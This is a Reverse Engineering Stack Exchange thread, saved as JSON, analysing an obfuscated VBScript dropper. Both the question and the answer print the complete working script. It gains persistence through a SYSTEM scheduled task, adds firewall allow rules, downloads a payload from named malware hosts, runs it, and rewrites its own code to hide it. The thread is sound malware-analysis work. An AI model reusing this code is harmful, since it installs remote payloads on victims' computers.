{
  "title": "Obfuscated VBE malware script analysis",
  "link": "https://reverseengineering.stackexchange.com/questions/23059/obfuscated-vbe-malware-script-analysis",
  "content": "Some actions of this script are clear e.g. the section that adds firewall rules, others not so much\n\n```\nOn Error Resume Next\n\nF27\nF10\nA0\nDBCF\n\nSub F27()\n    Dim E13C563AFCB34, C0009B48F34B, C8, BEBE2817704748838CC96E, B37C\n    With CreateObject(\"WScript.Shell\")\n        C0009B48F34B = Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\")\n        E13C563AFCB34 = .Environment(\"process\")(\"appdata\") & \"\\\" & Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\") & \"\\\"\n        With CreateObject(\"Scripting.FileSystemObject\")\n            C8 = .GetParentFolderName(WScript.ScriptFullName) & \"\\\"\n            BEBE2817704748838CC96E = \".\" & .GetExtensionName(WScript.ScriptFullName)\n            EA E13C563AFCB34\n            With .OpenTextFile(WScript.ScriptFullName, 1, False, -2) ' -2 - System default, -1 - Unicode, 0 - ASCII\n                B37C = .ReadAll\n                .Close\n            End With\n            If LCase(BEBE2817704748838CC96E) = \".vbe\" Then\n                B37C = B64C32BB17144(B37C)\n                B37C = FA2(B37C)\n                B37C = C87E(B37C)\n            Else\n                B37C = FA2(B37C)\n            End If\n            With .OpenTextFile(E13C563AFCB34 & C0009B48F34B & BEBE2817704748838CC96E, 2, True, -1)\n                .Write B37C\n                .Close\n            End With\n            .DeleteFile WScript.ScriptFullName, True\n            With .GetFolder(C8)\n                If .Files.Count = 0 And .SubFolders.Count = 0 Then\n                    .Delete True\n                End If\n            End With\n        End With\n        .Run \"schtasks /create /ru system /tn WindowsTaskCoreUpdate /sc onstart /tr \"\"\" & E13C563AFCB34 & C0009B48F34B & BEBE2817704748838CC96E & \"\"\" /f /rl highest\", 0, True\n    End With\nEnd Sub\n\nSub EA(D9CC7)\n    With CreateObject(\"Scripting.FileSystemObject\")\n        If Not .FolderExists(D9CC7) Then\n            EA .GetParentFolderName(D9CC7)\n            .CreateFolder D9CC7\n            With .GetFolder(D9CC7)\n                .Attributes = .Attributes Or 2\n            End With\n        End If\n    End With \nEnd Sub\n\nSub F10()\n    E306B \"WindowsIndexerCoreUpdate\", WScript.FullName\nEnd Sub\n\nSub E306B(B2D50C09F74D4D98929, F442D4A1)\n    With CreateObject(\"WScript.Shell\")\n        .Run \"netsh advfirewall firewall add rule name=\"\"\" & B2D50C09F74D4D98929 & \"\"\" dir=in action=allow description=\"\"\" & B2D50C09F74D4D98929 & \"\"\" program=\"\"\" & F442D4A1 & \"\"\" enable=yes\", 0, True\n        .Run \"netsh advfirewall firewall add rule name=\"\"\" & B2D50C09F74D4D98929 & \"\"\" dir=out action=allow description=\"\"\" & B2D50C09F74D4D98929 & \"\"\" program=\"\"\" & F442D4A1 & \"\"\" enable=yes\", 0, True\n    End With \nEnd Sub\n\nSub A0()\n    Dim CECCA989\n    Do\n        For Each CECCA989 In Array(\"facebook.com\", \"google.com\", \"youtube.com\", \"vk.com\", \"yahoo.com\", \"live.com\", \"instagram.com\")\n            With GetObject(\"winmgmts:{impersonationLevel=Impersonate}!\\\\.\\root\\CIMV2:Win32_PingStatus.Address='\" & CECCA989 & \"'\")\n                Select Case True\n                    Case IsNull(.StatusCode)\n                    Case .StatusCode <> 0\n                    Case Else Exit Sub\n                End Select\n            End  With\n        Next\n        WScript.Sleep 10000\n    Loop\nEnd Sub\n\nSub DBCF()\n    Dim CECCA989, F442D4A1, AEF, C\n    F442D4A1 = CreateObject(\"WScript.Shell\").Environment(\"process\")(\"temp\") & \"\\steam.vbe\"\n    For Each CECCA989 In Array(_\n        \"http://gmfordown.com/game.log\", _\n        \"http://tor4games.com/steam.lock\", _\n        \"http://dvx2videofr.com/pack.dll\")\n        CE9FC81B15 CECCA989, F442D4A1, AEF, C\n        If AEF = 200 And C = 0 Then Exit For\n    Next\n    If IsEmpty(CECCA989) Then Exit Sub\n    If LCase(Right(F442D4A1, 4)) = \".exe\" Then E306B \"WindowsGenericCoreUpdate\", F442D4A1\n    CreateObject(\"WScript.Shell\").Run F442D4A1, 0, True\nEnd Sub\n\nSub CE9FC81B15(CECCA989, F442D4A1, AEF, C)\n    Dim C5A1C339\n    On Error Resume Next\n    C = 0\n    With CreateObject(\"MSXML2.XMLHTTP\")\n        .Open \"GET\", CECCA989, False\n        .Send\n        AEF = .status\n        If AEF <> 200 Then Exit Sub\n        C5A1C339 = .responseBody\n    End With\n    C = Err.Number\n    If C <> 0 Then Exit Sub\n    With CreateObject(\"Scripting.FileSystemObject\")\n        If .FileExists(F442D4A1) Then .DeleteFile F442D4A1, True\n    End With\n    C = Err.Number\n    If C <> 0 Then Exit Sub\n    With CreateObject(\"ADODB.Stream\")\n        .Type = 1\n        .Open\n        .Write C5A1C339\n        .SaveToFile F442D4A1, 2\n        .Close\n    End With\n    C = Err.Number\nEnd Sub\n\nFunction FA2(ByVal D9FF4E5DA8)\n\n    Dim D9, CCD2479A6F784D5E9B13C7D, C01A, CD10282927844, C1, CA2C09B1068, DE, D3, E5, B1723AC3, CB59D564B, B39C9BDF\n\n    Set D9 = CreateObject(\"Scripting.Dictionary\")\n    Set CCD2479A6F784D5E9B13C7D = CreateObject(\"Scripting.Dictionary\")\n    Set C01A = CreateObject(\"Scripting.Dictionary\")\n    With New RegExp\n        .IgnoreCase = True\n        .Multiline = True\n        .Pattern = \"(?:\"\"(?:\"\"\"\"|[^\"\"  \n])*?\"\"(?!\"\"))\"\n        CD10282927844 = 0\n        Do\n            Set C1 = .Execute(D9FF4E5DA8)\n            If C1.Count = 0 Then Exit Do\n            Do\n                CA2C09B1068 = \"%\" & CD10282927844 & \"%\"\n                If Instr(D9FF4E5DA8, CA2C09B1068) = 0 Then Exit Do\n                CD10282927844 = CD10282927844 + 1\n            Loop\n            D9FF4E5DA8 = .Replace(D9FF4E5DA8, CA2C09B1068)\n            CCD2479A6F784D5E9B13C7D(CA2C09B1068) = C1(0).Value\n        Loop\n        D9FF4E5DA8 = Replace(D9FF4E5DA8, \":\", vbCrLf & \":\" & vbCrLf)\n        .Global = True\n        .Pattern = \"(\\bthen )(.+)\"\n        D9FF4E5DA8 = .Replace(D9FF4E5DA8, \"$1\" & vbCrLf & Chr(0) & vbCrLf & \"$2\")\n        .Pattern = \"^[ \\t]*(?:(?:private|public|public[ \\t]+default)[ \\t]+)?(?:function|sub|property[ \\t]+(?:let|set|get))[ \\t]+([a-z]\\w*)[ \\t]*\\((.*)\\)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D9(DE.SubMatches(0)) = \"\"\n            D3 = DE.SubMatches(1)\n            With New RegExp\n                .Global = True\n                .IgnoreCase = True\n                .Pattern = \"(?:\\b(?:byval|byref)[ \\t]+)?([a-z]\\w*)[ \\t]*\"\n                For Each E5 In .Execute(D3)\n                    D9(E5.SubMatches(0)) = \"\"\n                Next\n            End With\n        Next\n        .Pattern = \"^[ \\t]*(?:dim|redim[ \\t]+preserve|redim)[ \\t]+(.*?)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D3 = DE.SubMatches(0)\n            With New RegExp\n                .Global = True\n                .IgnoreCase = True\n                .Pattern = \"\\([^\\(]*?\\)\"\n                Do While .Test(D3)\n                    D3 = .Replace(D3, \"\")\n                Loop\n            End With\n            For Each B1723AC3 In Split(D3, \",\")\n                D9(Trim(B1723AC3)) = \"\"\n            Next\n        Next\n        .Pattern = \"^[ \\t]*class[ \\t]+([a-z]\\w*)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D9(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*for[ \\t]+each[ \\t]+([a-z]\\w*)[ \\t]+in[ \\t]+.+(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D9(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*for[ \\t]+([a-z]\\w*)[ \\t]*\\=[ \\t]*.+(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D9(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*(?:(?:set|const)[ \\t]+)?([a-z]\\w*)[ \\t]\\=[ \\t]*.+(?:$|'.*$)\"\n        For Each DE In .Execute(D9FF4E5DA8)\n            D9(DE.SubMatches(0)) = \"\"\n        Next\n        D9FF4E5DA8 = Replace(D9FF4E5DA8, vbCrLf & Chr(0) & vbCrLf, \"\")\n        D9FF4E5DA8 = Replace(D9FF4E5DA8, vbCrLf & \":\" & vbCrLf, \":\")\n        Randomize\n        CD10282927844 = 0\n        C01A(\"\") = \"\"\n        For Each CB59D564B In D9\n            .Pattern = \"\\b\" & CB59D564B & \"\\b\"\n            Do\n                B39C9BDF = Left(Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\"), 32 * Rnd * Rnd ^ 8 + 1)\n                Do While IsNumeric(Left(B39C9BDF, 1))\n                    B39C9BDF = Mid(B39C9BDF, 2)\n                Loop\n                If Not (C01A.Exists(B39C9BDF) Or D9.Exists(B39C9BDF)) Then\n                    C01A(B39C9BDF) = \"\"\n                    Exit Do\n                End If\n            Loop\n            D9FF4E5DA8 = .Replace(D9FF4E5DA8, B39C9BDF)\n            D9(CB59D564B) = B39C9BDF\n            CD10282927844 = CD10282927844 + 1\n        Next\n        .Global = False\n        .Pattern = \"(\\bgetref[ \\t]*\\([ \\t]*)(%\\d+%)([ \\t]*\\))\"\n        Do\n            Set C1 = .Execute(D9FF4E5DA8)\n            If C1.Count = 0 Then Exit Do\n            CA2C09B1068 = C1(0).SubMatches(1)\n            CB59D564B = CCD2479A6F784D5E9B13C7D(CA2C09B1068)\n            CB59D564B = Mid(CB59D564B, 2, Len(CB59D564B) - 2)\n            If D9.Exists(CB59D564B) Then\n                D9FF4E5DA8 = .Replace(D9FF4E5DA8, \"$1\"\"\" & D9(CB59D564B) & \"\"\"$3\")\n            Else\n                D9FF4E5DA8 = Replace(D9FF4E5DA8, CA2C09B1068, CCD2479A6F784D5E9B13C7D(CA2C09B1068))\n            End If\n        Loop\n        For Each CA2C09B1068 In CCD2479A6F784D5E9B13C7D\n            D9FF4E5DA8 = Replace(D9FF4E5DA8, CA2C09B1068, CCD2479A6F784D5E9B13C7D(CA2C09B1068))\n        Next\n    End With\n    FA2 = D9FF4E5DA8\n\nEnd Function\n\nFunction C87E(E00CD)\n\n    Dim E0841EA011\n\n    set E0841EA011 = CreateObject(\"Scripting.Encoder\")\n    E00CD = E0841EA011.EncodeScriptFile(\".vbs\", E00CD, 0, \"\")\n    If Asc(Right(E00CD, 1)) = 0 Then E00CD = Left(E00CD, Len(E00CD) - 1)\n    C87E = E00CD\n\nEnd Function\n\nFunction B64C32BB17144(E00CD)\n\n    Dim F7C49787803847\n    Dim AF5716\n\n    Do\n        AF5716 = 0\n        F7C49787803847 = InStr(E00CD, \"#@~^\")\n        If F7C49787803847 > 0 Then\n            If InStr(F7C49787803847, E00CD, \"==\") - F7C49787803847 = 10 Then\n                AF5716 = InStr(F7C49787803847, E00CD, \"==^#~@\")\n                If AF5716 > 0 Then\n                    E00CD = _\n                        Left(E00CD, F7C49787803847 - 1) & _\n                        E6168(Mid(E00CD, F7C49787803847 + 12, AF5716 - F7C49787803847 - 12 - 6)) & _\n                        Mid(E00CD, AF5716 + 6)\n                End If\n            End If\n        End If\n    Loop Until AF5716 = 0\n    B64C32BB17144 = E00CD\n\nEnd Function\n\nFunction E6168(E00CD)\n\n    Const FE2573C60644DC = \"1231232332321323132311233213233211323231311231321323112331123132\"\n\n    Dim E0841EA011, CD10282927844, A0, D1619D105014E6, D383AB927646D, BA\n    Dim B1990EE1E94(127)\n\n    Set E0841EA011 = WSCript.CreateObject(\"Scripting.Encoder\")\n    For CD10282927844 = 9 To 127\n        B1990EE1E94(CD10282927844) = \"JLA\"\n    Next\n    For CD10282927844 = 9 To 127\n        BA = Mid(E0841EA011.EncodeScriptFile(\".vbs\", String(3, CD10282927844), 0, \"\"), 13, 3)\n        For D1619D105014E6 = 1 To 3\n            A0 = Asc(Mid(BA, D1619D105014E6, 1))\n            B1990EE1E94(A0) = Left(B1990EE1E94(A0), D1619D105014E6 - 1) & Chr(CD10282927844) & Mid(B1990EE1E94(A0), D1619D105014E6 + 1)\n        Next\n    Next\n    B1990EE1E94(42) = Left(B1990EE1E94(42), 1) & \")\" & Right(B1990EE1E94(42), 1)\n    E00CD = Replace(Replace(E00CD, \"@&\", Chr(10)), \"@#\", Chr(13))\n    E00CD = Replace(Replace(E00CD, \"@*\", \">\"), \"@!\", \"<\")\n    E00CD = Replace(E00CD, \"@$\", \"@\")\n    D383AB927646D = -1\n    For CD10282927844 = 1 To Len(E00CD)\n        A0 = Asc(Mid(E00CD, CD10282927844, 1))\n        If A0 < 128 Then D383AB927646D = D383AB927646D + 1\n        If (A0 = 9) Or ((A0 > 31) And (A0 < 128)) Then\n            If (A0 <> 60) And (A0 <> 62) And (A0 <> 64) Then\n                E00CD = _\n                    Left(E00CD, CD10282927844 - 1) & _\n                    Mid(B1990EE1E94(A0), Mid(FE2573C60644DC, (D383AB927646D Mod 64) + 1, 1), 1) & _\n                    Mid(E00CD, CD10282927844 + 1)\n            End If\n        End If\n    Next\n    E6168 = E00CD\n\nEnd Function\n\n\nC9B0C270511241EBBF8 \"https://2no.co/177Ky7\"\nFunction C9B0C270511241EBBF8(F3)\nDim B3996\nSet B3996 = CreateObject(\"MSXML2.ServerXMLHTTP\")\nB3996.setTimeouts 0, 0, 0, 0\nB3996.Open \"GET\", F3, False\nB3996.send\nC9B0C270511241EBBF8 = B3996.responseText\nSet B3996 = Nothing\nEnd Function\n\n```\n",
  "votes": "0",
  "answers": 1,
  "views": "450",
  "tags": [
    "malware",
    "static-analysis",
    "deobfuscation"
  ],
  "user": "AndreaF",
  "time": "Jan 20, 2020 at 12:11",
  "comments": [
    {
      "user": "Paweł Łukasik",
      "text": "\"others not so much\" - so which ones aren't?",
      "time": null
    },
    {
      "user": "AndreaF",
      "text": "@PawełŁukasik e.g. what does the method F27 does exactly? Seems it call subrutines to perform obfuscation operations before adding tasks to scheduler but I cannot figure in detail.",
      "time": null
    },
    {
      "user": "tmr232",
      "text": "Please add details to your question. What is the issue? What is unclear? What are you trying to achieve?",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "This script is mostly obfuscated through renaming of variables and function names. I recommend using a tool such as Visual Studio Code Where you can right click the variable or function and select option \"Rename all occurrences\" and give everything human readable name. You can search for how a variable or function is generally used and give it a name based on that. Then for further testing I would test in an isolated virtual machine using a VBScript debugger and you can step line by line and analyse the results of variables. Or you could change the .Execute/ .Run etc to output the contents of the strings.\n\nAn example manually renaming the variables and functions makes it much easier to read:\n\n```\nOn Error Resume Next\n\nCreateScheduledTask\nAddFirewallRuleToAllowScript\nCheckIfOnline\nRunDownloadedPayload\nHttpGet \"https://2no.co/177Ky7\"\n\nSub CreateScheduledTask()\n    Dim TargetFolderName, Filename, ScriptFolder, FilenameExtension, ScriptContents\n    With CreateObject(\"WScript.Shell\")\n        Filename = Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\")\n        TargetFolderName = .Environment(\"process\")(\"appdata\") & \"\\\" & Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\") & \"\\\"\n        With CreateObject(\"Scripting.FileSystemObject\")\n            ScriptFolder = .GetParentFolderName(WScript.ScriptFullName) & \"\\\"\n            FilenameExtension = \".\" & .GetExtensionName(WScript.ScriptFullName)\n            CreateFolder TargetFolderName\n            With .OpenTextFile(WScript.ScriptFullName, 1, False, -2) ' -2 - System default, -1 - Unicode, 0 - ASCII\n                ScriptContents = .ReadAll\n                .Close\n            End With\n            If LCase(FilenameExtension) = \".vbe\" Then\n                ScriptContents = SomeStringOperation(ScriptContents)\n                ScriptContents = RunScript(ScriptContents)\n                ScriptContents = encodeString(ScriptContents)\n            Else\n                ScriptContents = RunScript(ScriptContents)\n            End If\n            With .OpenTextFile(TargetFolderName & Filename & FilenameExtension, 2, True, -1)\n                .Write ScriptContents\n                .Close\n            End With\n            .DeleteFile WScript.ScriptFullName, True\n            With .GetFolder(ScriptFolder)\n                If .Files.Count = 0 And .SubFolders.Count = 0 Then\n                    .Delete True\n                End If\n            End With\n        End With\n        .Run \"schtasks /create /ru system /tn WindowsTaskCoreUpdate /sc onstart /tr \"\"\" & TargetFolderName & Filename & FilenameExtension & \"\"\" /f /rl highest\", 0, True\n    End With\nEnd Sub\n\nSub CreateFolder(FolderName)\n    With CreateObject(\"Scripting.FileSystemObject\")\n        If Not .FolderExists(FolderName) Then\n            CreateFolder .GetParentFolderName(FolderName)\n            .CreateFolder FolderName\n            With .GetFolder(FolderName)\n                .Attributes = .Attributes Or 2\n            End With\n        End If\n    End With \nEnd Sub\n\nSub AddFirewallRuleToAllowScript()\n    AddFireWallRule \"Add\", WScript.FullName\nEnd Sub\n\nSub AddFireWallRule(FirewallRuleName, ProgramName)\n    With CreateObject(\"WScript.Shell\")\n        .Run \"netsh advfirewall firewall add rule name=\"\"\" & FirewallRuleName & \"\"\" dir=in action=allow description=\"\"\" & FirewallRuleName & \"\"\" program=\"\"\" & ProgramName & \"\"\" enable=yes\", 0, True\n        .Run \"netsh advfirewall firewall add rule name=\"\"\" & FirewallRuleName & \"\"\" dir=out action=allow description=\"\"\" & FirewallRuleName & \"\"\" program=\"\"\" & ProgramName & \"\"\" enable=yes\", 0, True\n    End With \nEnd Sub\n\nSub CheckIfOnline()\n    Dim Url\n    Do\n        For Each Url In Array(\"facebook.com\", \"google.com\", \"youtube.com\", \"vk.com\", \"yahoo.com\", \"live.com\", \"instagram.com\")\n            With GetObject(\"winmgmts:{impersonationLevel=Impersonate}!\\\\.\\root\\CIMV2:Win32_PingStatus.Address='\" & Url & \"'\")\n                Select Case True\n                    Case IsNull(.StatusCode)\n                    Case .StatusCode <> 0\n                    Case Else Exit Sub\n                End Select\n            End  With\n        Next\n        WScript.Sleep 10000\n    Loop\nEnd Sub\n\nSub RunDownloadedPayload()\n    Dim Url, ProgramName, HttpResponsecode, HttpErrorCode\n    ProgramName = CreateObject(\"WScript.Shell\").Environment(\"process\")(\"temp\") & \"\\steam.vbe\"\n    For Each Url In Array(_\n        \"http://gmfordown.com/game.log\", _\n        \"http://tor4games.com/steam.lock\", _\n        \"http://dvx2videofr.com/pack.dll\")\n        Download Url, ProgramName, HttpResponsecode, HttpErrorCode\n        If HttpResponsecode = 200 And HttpErrorCode = 0 Then Exit For\n    Next\n    If IsEmpty(Url) Then Exit Sub\n    If LCase(Right(ProgramName, 4)) = \".exe\" Then AddFireWallRule \"WindowsGenericCoreUpdate\", ProgramName\n    CreateObject(\"WScript.Shell\").Run ProgramName, 0, True\nEnd Sub\n\nSub Download(Url, ProgramName, HttpResponsecode, HttpErrorCode)\n    Dim HttpResponseBody\n    On Error Resume Next\n    HttpErrorCode = 0\n    With CreateObject(\"MSXML2.XMLHTTP\")\n        .Open \"GET\", Url, False\n        .Send\n        HttpResponsecode = .status\n        If HttpResponsecode <> 200 Then Exit Sub\n        HttpResponseBody = .responseBody\n    End With\n    HttpErrorCode = Err.Number\n    If HttpErrorCode <> 0 Then Exit Sub\n    With CreateObject(\"Scripting.FileSystemObject\")\n        If .FileExists(ProgramName) Then .DeleteFile ProgramName, True\n    End With\n    HttpErrorCode = Err.Number\n    If HttpErrorCode <> 0 Then Exit Sub\n    With CreateObject(\"ADODB.Stream\")\n        .Type = 1\n        .Open\n        .Write HttpResponseBody\n        .SaveToFile ProgramName, 2\n        .Close\n    End With\n    HttpErrorCode = Err.Number\nEnd Sub\n\nFunction RunScript(ByVal scriptContent)\n\n    Dim scriptingDictionary1, scriptingDictionary2, scriptingDictionary3, index, C1, percentIndexPercentString, DE, D3, E5, commaSeparatedValue, scriptingDictionaryResult, replaceTypeLibGuidRandomString\n\n    Set scriptingDictionary1 = CreateObject(\"Scripting.Dictionary\")\n    Set scriptingDictionary2 = CreateObject(\"Scripting.Dictionary\")\n    Set scriptingDictionary3 = CreateObject(\"Scripting.Dictionary\")\n    With New RegExp\n        .IgnoreCase = True\n        .Multiline = True\n        .Pattern = \"(?:\"\"(?:\"\"\"\"|[^\"\"  \n])*?\"\"(?!\"\"))\"\n        index = 0\n        Do\n            Set C1 = .Execute(scriptContent)\n            If C1.Count = 0 Then Exit Do\n            Do\n                percentIndexPercentString = \"%\" & index & \"%\"\n                If Instr(scriptContent, percentIndexPercentString) = 0 Then Exit Do\n                index = index + 1\n            Loop\n            scriptContent = .Replace(scriptContent, percentIndexPercentString)\n            scriptingDictionary2(percentIndexPercentString) = C1(0).Value\n        Loop\n        scriptContent = Replace(scriptContent, \":\", vbCrLf & \":\" & vbCrLf)\n        .Global = True\n        .Pattern = \"(\\bthen )(.+)\"\n        scriptContent = .Replace(scriptContent, \"$1\" & vbCrLf & Chr(0) & vbCrLf & \"$2\")\n        .Pattern = \"^[ \\t]*(?:(?:private|public|public[ \\t]+default)[ \\t]+)?(?:function|sub|property[ \\t]+(?:let|set|get))[ \\t]+([a-z]\\w*)[ \\t]*\\((.*)\\)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            scriptingDictionary1(DE.SubMatches(0)) = \"\"\n            D3 = DE.SubMatches(1)\n            With New RegExp\n                .Global = True\n                .IgnoreCase = True\n                .Pattern = \"(?:\\b(?:byval|byref)[ \\t]+)?([a-z]\\w*)[ \\t]*\"\n                For Each E5 In .Execute(D3)\n                    scriptingDictionary1(E5.SubMatches(0)) = \"\"\n                Next\n            End With\n        Next\n        .Pattern = \"^[ \\t]*(?:dim|redim[ \\t]+preserve|redim)[ \\t]+(.*?)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            D3 = DE.SubMatches(0)\n            With New RegExp\n                .Global = True\n                .IgnoreCase = True\n                .Pattern = \"\\([^\\(]*?\\)\"\n                Do While .Test(D3)\n                    D3 = .Replace(D3, \"\")\n                Loop\n            End With\n            For Each commaSeparatedValue In Split(D3, \",\")\n                scriptingDictionary1(Trim(commaSeparatedValue)) = \"\"\n            Next\n        Next\n        .Pattern = \"^[ \\t]*class[ \\t]+([a-z]\\w*)[ \\t]*(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            scriptingDictionary1(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*for[ \\t]+each[ \\t]+([a-z]\\w*)[ \\t]+in[ \\t]+.+(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            scriptingDictionary1(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*for[ \\t]+([a-z]\\w*)[ \\t]*\\=[ \\t]*.+(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            scriptingDictionary1(DE.SubMatches(0)) = \"\"\n        Next\n        .Pattern = \"^[ \\t]*(?:(?:set|const)[ \\t]+)?([a-z]\\w*)[ \\t]\\=[ \\t]*.+(?:$|'.*$)\"\n        For Each DE In .Execute(scriptContent)\n            scriptingDictionary1(DE.SubMatches(0)) = \"\"\n        Next\n        scriptContent = Replace(scriptContent, vbCrLf & Chr(0) & vbCrLf, \"\")\n        scriptContent = Replace(scriptContent, vbCrLf & \":\" & vbCrLf, \":\")\n        Randomize\n        index = 0\n        scriptingDictionary3(\"\") = \"\"\n        For Each scriptingDictionaryResult In scriptingDictionary1\n            .Pattern = \"\\b\" & scriptingDictionaryResult & \"\\b\"\n            Do\n                replaceTypeLibGuidRandomString = Left(Replace(Mid(CreateObject(\"Scriptlet.TypeLib\").Guid, 2, 36), \"-\", \"\"), 32 * Rnd * Rnd ^ 8 + 1)\n                Do While IsNumeric(Left(replaceTypeLibGuidRandomString, 1))\n                    replaceTypeLibGuidRandomString = Mid(replaceTypeLibGuidRandomString, 2)\n                Loop\n                If Not (scriptingDictionary3.Exists(replaceTypeLibGuidRandomString) Or scriptingDictionary1.Exists(replaceTypeLibGuidRandomString)) Then\n                    scriptingDictionary3(replaceTypeLibGuidRandomString) = \"\"\n                    Exit Do\n                End If\n            Loop\n            scriptContent = .Replace(scriptContent, replaceTypeLibGuidRandomString)\n            scriptingDictionary1(scriptingDictionaryResult) = replaceTypeLibGuidRandomString\n            index = index + 1\n        Next\n        .Global = False\n        .Pattern = \"(\\bgetref[ \\t]*\\([ \\t]*)(%\\d+%)([ \\t]*\\))\"\n        Do\n            Set C1 = .Execute(scriptContent)\n            If C1.Count = 0 Then Exit Do\n            percentIndexPercentString = C1(0).SubMatches(1)\n            scriptingDictionaryResult = scriptingDictionary2(percentIndexPercentString)\n            scriptingDictionaryResult = Mid(scriptingDictionaryResult, 2, Len(scriptingDictionaryResult) - 2)\n            If scriptingDictionary1.Exists(scriptingDictionaryResult) Then\n                scriptContent = .Replace(scriptContent, \"$1\"\"\" & scriptingDictionary1(scriptingDictionaryResult) & \"\"\"$3\")\n            Else\n                scriptContent = Replace(scriptContent, percentIndexPercentString, scriptingDictionary2(percentIndexPercentString))\n            End If\n        Loop\n        For Each percentIndexPercentString In scriptingDictionary2\n            scriptContent = Replace(scriptContent, percentIndexPercentString, scriptingDictionary2(percentIndexPercentString))\n        Next\n    End With\n    RunScript = scriptContent\n\nEnd Function\n\nFunction encodeString(inputString)\n\n    Dim ScriptingEncoder\n\n    set ScriptingEncoder = CreateObject(\"Scripting.Encoder\")\n    inputString = ScriptingEncoder.EncodeScriptFile(\".vbs\", inputString, 0, \"\")\n    If Asc(Right(inputString, 1)) = 0 Then inputString = Left(inputString, Len(inputString) - 1)\n    encodeString = inputString\n\nEnd Function\n\nFunction SomeStringOperation(inputString)\n\n    Dim positionOfHashAt\n    Dim positionOfEqualEqual\n\n    Do\n        positionOfEqualEqual = 0\n        positionOfHashAt = InStr(inputString, \"#@~^\")\n        If positionOfHashAt > 0 Then\n            If InStr(positionOfHashAt, inputString, \"==\") - positionOfHashAt = 10 Then\n                positionOfEqualEqual = InStr(positionOfHashAt, inputString, \"==^#~@\")\n                If positionOfEqualEqual > 0 Then\n                    inputString = _\n                        Left(inputString, positionOfHashAt - 1) & _\n                        encodeString2(Mid(inputString, positionOfHashAt + 12, positionOfEqualEqual - positionOfHashAt - 12 - 6)) & _\n                        Mid(inputString, positionOfEqualEqual + 6)\n                End If\n            End If\n        End If\n    Loop Until positionOfEqualEqual = 0\n    SomeStringOperation = inputString\n\nEnd Function\n\nFunction encodeString2(inputString)\n\n    Const numberStringSeed = \"1231232332321323132311233213233211323231311231321323112331123132\"\n\n    Dim ScriptingEncoder, index, CheckIfOnline, D1619D105014E6, D383AB927646D, BA\n    Dim JlaIndex(127)\n\n    Set ScriptingEncoder = WSCript.CreateObject(\"Scripting.Encoder\")\n    For index = 9 To 127\n        JlaIndex(index) = \"JLA\"\n    Next\n    For index = 9 To 127\n        BA = Mid(ScriptingEncoder.EncodeScriptFile(\".vbs\", String(3, index), 0, \"\"), 13, 3)\n        For D1619D105014E6 = 1 To 3\n            CheckIfOnline = Asc(Mid(BA, D1619D105014E6, 1))\n            JlaIndex(CheckIfOnline) = Left(JlaIndex(CheckIfOnline), D1619D105014E6 - 1) & Chr(index) & Mid(JlaIndex(CheckIfOnline), D1619D105014E6 + 1)\n        Next\n    Next\n    JlaIndex(42) = Left(JlaIndex(42), 1) & \")\" & Right(JlaIndex(42), 1)\n    inputString = Replace(Replace(inputString, \"@&\", Chr(10)), \"@#\", Chr(13))\n    inputString = Replace(Replace(inputString, \"@*\", \">\"), \"@!\", \"<\")\n    inputString = Replace(inputString, \"@$\", \"@\")\n    D383AB927646D = -1\n    For index = 1 To Len(inputString)\n        CheckIfOnline = Asc(Mid(inputString, index, 1))\n        If CheckIfOnline < 128 Then D383AB927646D = D383AB927646D + 1\n        If (CheckIfOnline = 9) Or ((CheckIfOnline > 31) And (CheckIfOnline < 128)) Then\n            If (CheckIfOnline <> 60) And (CheckIfOnline <> 62) And (CheckIfOnline <> 64) Then\n                inputString = _\n                    Left(inputString, index - 1) & _\n                    Mid(JlaIndex(CheckIfOnline), Mid(numberStringSeed, (D383AB927646D Mod 64) + 1, 1), 1) & _\n                    Mid(inputString, index + 1)\n            End If\n        End If\n    Next\n    encodeString2 = inputString\n\nEnd Function\n\nFunction HttpGet(Url)\nDim ServerXMLHttp\nSet ServerXMLHttp = CreateObject(\"MSXML2.ServerXMLHTTP\")\nServerXMLHttp.setTimeouts 0, 0, 0, 0\nServerXMLHttp.Open \"GET\", Url, False\nServerXMLHttp.send\nHttpGet = ServerXMLHttp.responseText\nSet ServerXMLHttp = Nothing\nEnd Function\n\n```\n",
      "votes": "4",
      "user": "chentiangemalc",
      "time": "Jan 21, 2020 at 0:23",
      "is_accepted": false,
      "comments": []
    }
  ]
}